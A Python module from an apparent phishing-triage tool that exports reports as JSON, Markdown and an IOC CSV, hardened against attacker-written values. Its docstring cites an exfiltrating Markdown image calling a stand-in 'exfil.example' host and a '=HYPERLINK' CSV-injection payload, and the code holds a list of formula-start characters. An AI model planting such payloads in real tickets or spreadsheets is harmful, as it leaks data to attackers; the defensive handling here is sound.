"""Exports of one report: JSON (for tools), Markdown (for a ticket), and an IOC list (CSV, for blocklists).

Each format is hardened for where it will be pasted or opened, because every value in it may have been
written by the attacker:
  - Markdown: email text goes inside code spans, so a subject like ![x](https://exfil.example/?d=...)
    cannot become a tracking image in the ticketing system, and links are defanged;
  - CSV: a cell starting with = + - @ is prefixed with ', so a spreadsheet does not run it as a formula
    (CSV injection: =HYPERLINK(...) in a file name);
  - JSON: raw values for tools, which must escape them like any email content.
"""
from __future__ import annotations

import csv
import io
import ipaddress
from dataclasses import asdict

from phishtriage.analyze import facts_to_dict
from phishtriage.display import defang, shorten, visible
from phishtriage.rules.engine import MITRE_TECHNIQUES, display_order

_FORMULA_START = ("=", "+", "-", "@", "\t", "\r")


def report_json(report) -> dict:
    data = {
        "tool": "phishtriage",
        "file": report.filename,
        "sha256": report.sha256,
        "size": report.size,
        "analyzed_at": report.analyzed_at,
        "options": asdict(report.options),
        "label": report.label,
        "error": report.error,
    }
    if report.verdict is not None:
        data["verdict"] = {**asdict(report.verdict), "label": report.verdict.label, "coverage": report.verdict.coverage}
    if report.facts is not None:
        data["facts"] = facts_to_dict(report.facts)
    if report.summary is not None:
        data["summary"] = {key: value for key, value in asdict(report.summary).items() if key != "raw_output"}
    return data


def code(value, limit: int = 300, defanged: bool = True) -> str:
    """Untrusted text as a Markdown code span: never rendered as a link, image, HTML or formatting.
    Indicators are also defanged, for whoever copies them; file names are not (`invoice.pdf.exe` must stay readable)."""
    text = shorten(value, limit)
    text = " ".join(visible(defang(text) if defanged else text).split()) or " "
    fence = "`"
    while fence in text:
        fence += "`"
    padding = " " if text.startswith("`") or text.endswith("`") else ""
    return f"{fence}{padding}{text}{padding}{fence}"


def _prose(value) -> str:
    """Text the tool's checks already cleaned (the AI summary), with Markdown syntax escaped anyway."""
    text = " ".join(visible(defang(value)).split())
    return "".join("\\" + char if char in "\\`*_{}[]()#+-.!|<>~" else char for char in text)


def report_markdown(report) -> str:
    o = report.options
    used = [name for name, on in (("reputation lookups", o.lookups), ("urlscan.io scans", o.lookups and o.scan),
                                  ("local AI summary", o.ai)) if on]
    lines = [f"# Phishing triage: {report.label}", "",
             f"- **File:** {code(report.filename, 120, defanged=False)} (SHA-256 `{report.sha256}`, {report.size} bytes)",
             f"- **Analyzed:** {report.analyzed_at} with phishtriage, "
             + (", ".join(used) if used else "offline (no reputation lookups)")]
    if report.failed:
        lines += ["", "## Analysis failed", "",
                  f"The email could not be analyzed: {code(report.error)}. That is not a sign it is safe: an email "
                  "built to crash or stall a parser is itself suspicious. Handle it as Suspicious.", ""]
        return "\n".join(lines)
    v, f = report.verdict, report.facts
    lines += [f"- **Verdict:** {v.label}: {'; '.join(v.reasons)}", ""]
    if v.actions:
        lines += ["## What to do", ""] + [f"{n}. {action}" for n, action in enumerate(v.actions, 1)] + [""]
    lines += ["## Findings", ""]
    for finding in display_order(v.findings):
        techniques = f" [{', '.join(finding.mitre)}]" if finding.mitre else ""
        capped = f" (capped; rule +{finding.rule_points})" if finding.capped else ""
        lines.append(f"- **{finding.points:+d} {finding.id}**{capped} {finding.title}: {code(finding.evidence)}"
                     f"{techniques}")
    if not v.findings:
        lines.append("- No rule fired.")
    lines += ["", f"_{v.coverage}_", ""]
    if v.mitre:
        lines += ["**MITRE ATT&CK:** " + "; ".join(f"{t} {MITRE_TECHNIQUES.get(t, '')}".strip() for t in v.mitre), ""]
    if report.summary is not None:
        s = report.summary
        who = f"written by the local AI ({s.model}), checked by code; it cannot change the verdict" if s.source == "ai" \
            else "built from the findings (no AI text shown)"
        lines += [f"## Summary ({who})", "", f"> {_prose(s.summary)}", ""]
    sender = f.headers.sender
    lines += ["## Email", "",
              f"- **Subject:** {code(f.email.subject)}",
              f"- **From:** {code(sender.display_name, 120)} {code(sender.address, 120)}",
              f"- **Date:** {code(f.email.date or 'missing', 60)}; Message-ID {code(f.email.message_id, 160)}",
              f"- **Authentication:** SPF {code(f.auth.spf, 30)}, DKIM "
              + (", ".join(f"{code(result, 30)} ({code(domain, 80)})" for result, domain in f.auth.dkim) or "missing")
              + f", DMARC {code(f.auth.dmarc, 30)}", ""]
    rows = iocs(report)
    if rows:
        lines += ["## Indicators (defanged)", ""]
        # The context can hold an attachment's file name, written by the attacker: escaped like any text
        lines += [f"- {row['type']}: {code(row['value'])} ({_prose(row['context'])})" for row in rows[:60]]
        if len(rows) > 60:
            lines.append(f"- ... {len(rows) - 60} more in the IOC export")
    return "\n".join(lines) + "\n"


def _public_ip(value: str) -> bool:
    try:
        return ipaddress.ip_address(value).is_global
    except ValueError:
        return False


def iocs(report) -> list[dict]:
    """Indicators worth blocking or hunting for: type, value, defanged value, where it was found."""
    if report.facts is None:
        return []
    f = report.facts
    rows, seen = [], set()

    def add(kind: str, value: str, context: str) -> None:
        if value and (kind, value) not in seen:
            seen.add((kind, value))
            rows.append({"type": kind, "value": value, "defanged": defang(value), "context": context})

    sender = f.headers.sender
    add("email", sender.address, "From")
    add("domain", sender.domain, "From domain")
    for domain in f.headers.reply_to_domains:
        add("domain", domain, "Reply-To domain")
    add("domain", f.headers.return_path_domain, "Return-Path domain")
    if _public_ip(f.auth.sender_ip):
        add("ip", f.auth.sender_ip, "sending server")
    for link in f.indicators.links:
        if link.scheme in ("http", "https"):
            add("url", link.url, f"link ({link.source})")
            add("ip" if link.host_is_ip else "domain", link.host, f"link host ({link.source})")
    for qr in f.indicators.qr_codes:
        add("qr", qr.text, f"QR code in {qr.source}")
    for item in f.indicators.attachments:
        if not item.inline:
            add("sha256", item.sha256, f"attachment {visible(item.filename) or '(no name)'}")
    for number in f.indicators.phone_numbers:
        add("phone", number, "phone number in the text")
    return rows


def _cell(value) -> str:
    text = visible(str(value))
    return "'" + text if text.startswith(_FORMULA_START) else text


def write_csv(rows: list[dict], columns: list[str]) -> str:
    out = io.StringIO()
    writer = csv.writer(out, lineterminator="\r\n")
    writer.writerow(columns)
    for row in rows:
        writer.writerow([_cell(row.get(column, "")) for column in columns])
    return out.getvalue()


def iocs_csv(report) -> str:
    return write_csv(iocs(report), ["type", "value", "defanged", "context"])
